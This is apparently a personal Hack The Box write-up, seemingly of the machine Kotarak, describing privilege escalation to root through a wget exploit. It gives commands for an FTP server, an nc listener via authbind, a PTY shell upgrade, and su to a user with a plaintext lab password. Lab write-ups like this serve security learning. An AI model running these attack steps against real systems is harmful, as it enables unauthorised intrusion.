
```bash
# Tmux is good one pane for each
# FTP server
python3 -m pyftpdlib -p21 -w
# python2 exploit
python2 wget-exploit.py
```

![1080](pyftpserverserving.png)

![](wgetexploiting.png)

Wget ATANAS
![](atanaswget.png)

My issue is that we are in a container. Secondly I am not trusting myself. The second picture points out the /root is avaliable. I presume it was mixture of tired and with cold, not trusting myself to go that is not a default configuration, Busra must be on point. I read [0xdf](https://0xdf.gitlab.io/2021/05/19/htb-kotarak.html#shell-as-root) and I definately remember reading it before also. 

#### Clean run to root

Interesting I had paused. There is alot here.
![](archivestowget.png)
- IP of the host run the container.
- A different version of wget from the container.

Find indications of network traffic is directed to the box?

We need low-port usage so using `authbind` - [Wiki](https://en.wikipedia.org/wiki/Authbind)
```bash
authbind nc -lnvp 80
```

![](pleasearchive.png)

The only thing I need to point out here is that we are targeting 10.0.3.1 - so we need the same infrastructure on the box. 

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=screen-256color 
# Ctrl Z
# Check rows and cols
stty -a
stty -raw echo;fg
stty rows 52 cols 117
su atanas - 
 f16tomcat!
```

Changes to the script
![](changeschanges.png)
Remembering packet economy:
```bash
sed -i 's/10.129.117/10.129.1.117/g' wget-exploit.py
```


```bash
authbind python -m pyftpdlib -p21 -w
authbind python wget-exploit.py
```